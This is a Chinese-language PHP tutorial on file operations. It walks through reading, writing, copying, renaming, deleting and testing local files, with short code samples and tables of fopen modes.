<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//假设我们有一个多行的文件叫NoAlike.txt，没有的话你可以新建一个这个文件</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开这个文件，将文件内容赋值给$filestring</span></span><br><span class="line">   <span class="variable">$filestring</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//因为每一行有一个回车即\n，我用\n来把这个字符串切割成数组</span></span><br><span class="line">   <span class="variable">$filearray</span> = explode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$filestring</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把切割成的数组，下标赋值给$key,值赋值给$val，每次循环将$key加1。</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$val</span>) = each(<span class="variable">$filearray</span>)) &#123;</span><br><span class="line">       ++<span class="variable">$key</span>;</span><br><span class="line">       <span class="variable">$val</span> = trim(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//用的单引号，单引号不解释变量进行了拼接而已</span></span><br><span class="line">       <span class="keyword">print</span> <span class="string">&#x27;Line&#x27;</span> . <span class="variable">$key</span> .<span class="string">&#x27;:&#x27;</span>.  <span class="variable">$val</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">上述的<font color="#00B2EE">explode()、list()</font>两个字符串函数和<font color="#00B2EE">each()</font>数组函数。<br><font color="red"><strong>1. explode()函数：</strong></font><strong>把字符串打散为数组</strong>。</font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数</a>]</font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_string.asp">PHP String 函数</a>]</font><br>语法：explode(separator,string,limit)<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">separator</td>
<td align="left">必需。规定在哪里分割字符串。</td>
</tr>
<tr>
<td align="center">string</td>
<td align="left">必需。要分割的字符串。</td>
</tr>
<tr>
<td align="center">limit</td>
<td align="left">可选。规定所返回的数组元素的数目。<br>可能的值：<br>大于 0 - 返回包含最多 limit 个元素的数组<br>小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组<br>0 - 返回包含一个元素的数组</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. list()函数：</strong></font><strong>把数组中的值赋给一些变量,在一次操作中给一组变量赋值。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_list.asp">PHP list() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>) = <span class="variable">$my_array</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I have several animals, a <span class="subst">$a</span>, a <span class="subst">$b</span> and a <span class="subst">$c</span>.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. each()函数：</strong></font><strong>返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。<br>两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp">PHP each() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$people</span> = <span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Steve&quot;</span>, <span class="string">&quot;Mark&quot;</span>, <span class="string">&quot;David&quot;</span>);</span><br><span class="line">var_dump(each(<span class="variable">$people</span>));</span><br><span class="line">var_dump(each(<span class="variable">$people</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">G:\WAMP\www\<span class="number">2</span>-<span class="number">20</span>-<span class="number">1</span>.php:<span class="number">3</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">G:\WAMP\www\<span class="number">2</span>-<span class="number">20</span>-<span class="number">1</span>.php:<span class="number">4</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-fopen、fread、fclose操作读取文件"><a href="#1-3-fopen、fread、fclose操作读取文件" class="headerlink" title="1.3 fopen、fread、fclose操作读取文件"></a><font color="#3CB371" face="Comic sans MS">1.3 fopen、fread、fclose操作读取文件</font></h4><p>上面file_get_contents打开文件的方式简单、粗暴。下面的<br><font face="Comic sans MS"><font color="#00B2EE"><strong>resource fopen ( string $文件名, string 模式)<br>string fread ( resource $操作资源, int 读取长度)<br>bool fclose ( resource $操作资源 )</strong></font></p>
<p>通过上面的函数我们来讲解<strong>资源类型</strong>的通常操作方式：<br>1.打开资源<br>2.使用相关函数进行操作<br>3.关闭资源<br>&amp;emsp;<br><font color="red"><strong>1. fopen函数：</strong></font><strong>打开文件，返回一个资源</strong><br>参数主要有两个：1.文件打开的路径，2.打开文件的模式<br>例：$fp&#x3D;fopen(‘NoAlike.txt’, “r”);<br></font></p>
<blockquote>
<p><strong>返回类型是一个资源类型。<br>资源类型需要其他的函数来操作这个资源。</strong><font color="#FF7F00"><strong>所有的资源有打开就要有关闭。</strong></font></p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>2. fread函数：</strong></font><strong>读取打开的文件资源。</strong><br>也包含两个参数，读取指定长度的文件资源，读取一部份向后移动一部份。至到文件结尾。<br>例：$contents &#x3D; fread($fp, 1024);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. fclose函数：</strong></font><strong>fclose函数的功能是关闭资源。资源有打开就有关闭。</strong><br>包含一个参数，这个参数就是fopen()返回的资源。<br>例：fclose($fp);<br></font> </p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>fopen的模式</strong></font>有下面几个(。・∀・)ノ<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a+</td>
<td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回<br> FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">x+</td>
<td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 <br>FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>r模式示例：</strong></font><br>1.打开文件：fopen()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//你可以创建一个NoAlike.txt，以只读模式打开</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span></span><br><span class="line">   var_dump(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>2.读取文件：fread()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开一个文件类型后，读取长度</span></span><br><span class="line">   <span class="variable">$contents</span> = fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>3.关闭文件：fclose()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">   <span class="variable">$contents</span> = fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">   fclose(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>其他注意事项：</strong></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">t</td>
<td align="left">windows下将\n转为\r\n</td>
</tr>
<tr>
<td align="center">b</td>
<td align="left">二进制打开模式</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>说明：</strong></font><br>Windows 下提供了一个文本转换标记（’t’）可以透明地将 \n 转换为 \r\n。<br>与此对应还可以使用 ‘b’ 来强制使用二进制模式，这样就不会转换数据。要使用这些标记，要么用 ‘b’ 或者用 ‘t’ 作为 mode 参数的最后一个字符。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-创建和修改文件内容"><a href="#二-创建和修改文件内容" class="headerlink" title="二. 创建和修改文件内容"></a><font color="#FF6347" face="Comic sans MS">二. 创建和修改文件内容</font></h3><h4 id="2-1-file-put-contents写入文件"><a href="#2-1-file-put-contents写入文件" class="headerlink" title="2.1 file_put_contents写入文件"></a><font color="#3CB371" face="Comic sans MS">2.1 file_put_contents写入文件</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int file_put_contents ( string $文件路径, string $写入数据])</strong></font><br></font></p>
<blockquote>
<p><strong>功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$data</span> = <span class="string">&quot;在PHP中文网学好PHP，妹子票子不再话下！&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$numbytes</span> = file_put_contents(<span class="string">&#x27;bin.txt&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$numbytes</span>)&#123;</span><br><span class="line">      <span class="comment">//$numbytes接收到整形的数字</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入成功，我们读取看看结果试试：&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;bin.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入失败或者没有权限，注意检查&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较"><a href="#2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较" class="headerlink" title="2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较"></a><font color="#3CB371" face="Comic sans MS">2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int fwrite ( resource $文件资源变量, string $写入的字符串 [, int 长度])</strong></font><br>注：fwrite的别名函数是fputs</p>
<p><font color="red"><strong>1. fopen()的w模式：</strong></font>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建。每一次写入新的数据时，都会将原来的数据清空之后才写入！<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= fopen(<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">   <span class="variable">$len</span> = fwrite(<span class="variable">$fp</span>, <span class="string">&#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;</span>);</span><br><span class="line">   fclose(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">print</span> <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br><strong>1. 不论有没有新建都会打开文件重新写入<br>2.原有的文件内容会被覆盖掉<br>3.文件不存在会创建</strong></p>
</blockquote>
<p>那我们来对比一下以下几个模式的不同：</p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只能读不能使用fwrite写</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">可操作读、写(可使用fwrite写入)</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">只可以写功能</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">即可读又可以写</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="2-3-a模式和w模式、x模式和w模式的不同"><a href="#2-3-a模式和w模式、x模式和w模式的不同" class="headerlink" title="2.3 a模式和w模式、x模式和w模式的不同"></a><font color="#3CB371" face="Comic sans MS">2.3 a模式和w模式、x模式和w模式的不同</font></h4><p><font color="#FF7F00"><strong>1. a模式和w模式总结：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">总结</th>
</tr>
</thead>
<tbody><tr>
<td align="center">x</td>
<td align="left">每次写入会干掉原有文件的内容，文件不存在都会创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">每次写入都会向文件的尾端追加内容</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>2. x模式和w模式总结：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= fopen(<span class="variable">$filename</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">   <span class="variable">$len</span> = fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;读大学迷茫了，PHP中文网学PHP给你希望&#x27;</span>);</span><br><span class="line">   <span class="keyword">echo</span>  <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>总结：</strong><br>   1.文件存在的时候会报错<br>   2.如果把$filename 改成其他的文件名,就可以了。但是，再次刷新的时候又报错了<br>   3.x+ 是增强的x模式。读取时也可以使用。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-创建临时文件"><a href="#三-创建临时文件" class="headerlink" title="三. 创建临时文件"></a><font color="#FF6347" face="Comic sans MS">三. 创建临时文件</font></h3><p>使用这个函数：<font color="#00B2EE"><strong>resource tmpfile ( )</strong></font></p>
<blockquote>
<p><strong>功能：创建一个临时文件，返回资源类型。关闭文件即被删除。</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件,创建后并且打开这个文件	</span><br><span class="line">   <span class="variable">$handle</span> = tmpfile();</span><br><span class="line"></span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   <span class="variable">$numbytes</span> = fwrite(<span class="variable">$handle</span>, <span class="string">&#x27;写入临时文件&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span>  <span class="string">&#x27;向临时文件中写入了&#x27;</span>.<span class="variable">$numbytes</span> . <span class="string">&#x27;个字节&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-移动、拷贝和删除文件"><a href="#四-移动、拷贝和删除文件" class="headerlink" title="四. 移动、拷贝和删除文件"></a><font color="#FF6347" face="Comic sans MS">四. 移动、拷贝和删除文件</font></h3><h4 id="4-1-重命名文件"><a href="#4-1-重命名文件" class="headerlink" title="4.1 重命名文件"></a><font color="#3CB371" face="Comic sans MS">4.1 重命名文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>rename(oldname,newname,context)</strong></font>;<br></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">oldname</td>
<td align="left">必需。规定要重命名的<strong>文件</strong>或**目录(文件夹)**。</td>
</tr>
<tr>
<td align="center">newname</td>
<td align="left">必需。规定文件或目录的新名称。</td>
</tr>
<tr>
<td align="center">context</td>
<td align="left">可选。规定文件句柄的环境。context 是可修改流的行为的一套选项。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//旧文件名</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.php.old&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//新文件名</span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//复制文件</span></span><br><span class="line">   rename(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-2-复制文件"><a href="#4-2-复制文件" class="headerlink" title="4.2 复制文件"></a><font color="#3CB371" face="Comic sans MS">4.2 复制文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>copy(源文件,目标文件)</strong></font>;<br></font> </p>
<blockquote>
<p><strong>功能：将指定路径的源文件，复制一份到目标文件的位置。如果复制到当前目录下，则必须重新改一个名字，其他目录下的话也要在目的路径下加上文件名，不管改不改名字。</strong></p>
</blockquote>
<p>copy(source,destination):</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">source</td>
<td align="left">必需。规定要复制的文件。</td>
</tr>
<tr>
<td align="center">destination</td>
<td align="left">必需。规定复制文件的目的地。</td>
</tr>
</tbody></table>
<p>(1)创建文件并复制到当前文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   <span class="variable">$fi</span> = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   <span class="variable">$a</span>=fwrite(<span class="variable">$fi</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="variable">$filename</span> . <span class="string">&#x27;_new.txt&#x27;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line">   fclose(<span class="variable">$fi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(2)创建文件并复制到其他文件夹下面<font color="#FF7F00">↓↓</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//创建文件</span></span><br><span class="line">   <span class="variable">$fi</span> = fopen(<span class="string">&#x27;copy.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);  </span><br><span class="line">   <span class="variable">$a</span>=fwrite(<span class="variable">$fi</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">   <span class="comment">//旧文件名 </span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;copy.txt&#x27;</span>;  </span><br><span class="line">   <span class="comment">//新文件名   </span></span><br><span class="line">   <span class="variable">$filename2</span> = <span class="string">&quot;./01/copy.txt&quot;</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="comment">//修改名字。</span></span><br><span class="line">   copy(<span class="variable">$filename</span>, <span class="variable">$filename2</span>);</span><br><span class="line">   fclose(<span class="variable">$fi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="4-3-删除文件"><a href="#4-3-删除文件" class="headerlink" title="4.3 删除文件"></a><font color="#3CB371" face="Comic sans MS">4.3 删除文件</font></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>unlink(指定路径的文件)</strong></font>;<br></font> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (unlink(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">       <span class="keyword">echo</span>  <span class="string">&quot;删除文件成功 <span class="subst">$filename</span>!\n&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;删除 <span class="subst">$filename</span> 失败!\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-检测文件属性函数"><a href="#五-检测文件属性函数" class="headerlink" title="五. 检测文件属性函数"></a><font color="#FF6347" face="Comic sans MS">五. 检测文件属性函数</font></h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">bool file_exists ( $指定文件名或者文件路径)</td>
<td align="left">文件是否存在</td>
</tr>
<tr>
<td align="left">bool is_readable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可读</td>
</tr>
<tr>
<td align="left">bool is_writeable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可写</td>
</tr>
<tr>
<td align="left">bool is_executable ( $指定文件名或者文件路径)</td>
<td align="left">文件是否可执行</td>
</tr>
<tr>
<td align="left">bool is_file ( $指定文件名或者文件路径)</td>
<td align="left">是否是文件</td>
</tr>
<tr>
<td align="left">bool is_dir ( $指定文件名或者文件路径)</td>
<td align="left">是否是目录</td>
</tr>
<tr>
<td align="left">void clearstatcache ( void )</td>
<td align="left">清楚文件的状态缓存</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$g</span>=file_exists(<span class="string">&quot;install.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$g</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;install.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;已安装，请不要再次进行安装&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="number">5462564</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：<span class="number">1</span> 已安装，请不要再次进行安装</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六-文件常用函数和常量"><a href="#六-文件常用函数和常量" class="headerlink" title="六. 文件常用函数和常量"></a><font color="#FF6347" face="Comic sans MS">六. 文件常用函数和常量</font></h3><h4 id="6-1-目录分割符常量"><a href="#6-1-目录分割符常量" class="headerlink" title="6.1 目录分割符常量"></a><font color="#3CB371" face="Comic sans MS">6.1 目录分割符常量</font></h4><table>
<thead>
<tr>
<th align="center">平台</th>
<th align="left">分割符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">windows</td>
<td align="left">\ 或者 &#x2F;</td>
</tr>
<tr>
<td align="center">类unix</td>
<td align="left">&#x2F;</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>windows 的路径格式为 d:\xxx\xxx 注意：windows支持 d:&#x2F;xxx&#x2F;xxx</li>
<li>linux 的路径格式为 &#x2F;home&#x2F;xxx&#x2F;xxx 注意：如果\home\xxx\xxx 在linux上是<strong>错误</strong>的</li>
<li>所以当开启转义之类的话，转义字符 \ 用一起的话 d:\xxx\xxx 是一样的。判断时候有两个 \ 有的话 再转成一个\ 再把 \ 替换成 &#x2F;当路径分割，这样在linux上或者windos上的路径就能保持统一了。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="6-2-DIRECTORY-SEPARATOR常量"><a href="#6-2-DIRECTORY-SEPARATOR常量" class="headerlink" title="6.2 DIRECTORY_SEPARATOR常量"></a><font color="#3CB371" face="Comic sans MS">6.2 DIRECTORY_SEPARATOR常量</font></h4><p><font face="Comic sans MS">在 Windows 中，斜线（&#x2F;）和反斜线（\）都可以用作目录分隔符，在linux上路径的分隔符是&#x2F;，这就导致了一个问题，比如开发机器是windows，有一个图片上传程序，，而我们又使用了(\)作为文件分隔符，调试机器上指定的上传文件保存目录是：<br>define(‘ROOT’,dirname(_<em>FILE</em>_).”\upload”)，在本地调试都很正常，但是上传到linux服务器的时候会发现会出错。<br>这个问题就是出在文件的分隔符上，windows上习惯性的使用\作为文件分隔符，但是在linux上人家是不认识这个标识的，人家只认识&#x2F;，于是就要引入下面这个php内置变量了：<font color="#00B2EE"><strong>DIRECTORY_SEPARATOR</strong></font>。</p>
<p>上面的写法可以改写为以下无错写法：<br>define(‘ROOT’,dirname(_<em>FILE</em>_).DIRECTORY_SEPARATOR.”upload”);<br>这样就可以确保不会出错了。<br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font><br>DIRECTORY_SEPARATOR是一个<font color="#FF7F00"><strong>返回跟操作系统相关的路径分隔符</strong></font>的php内置命令，在windows上返回\，而在linux或者类unix上返回&#x2F;，就是这么个区别，通常在定义包含文件路径或者上传保存目录的时候会用到。</p>
</blockquote>
<p>&amp;emsp;</p>
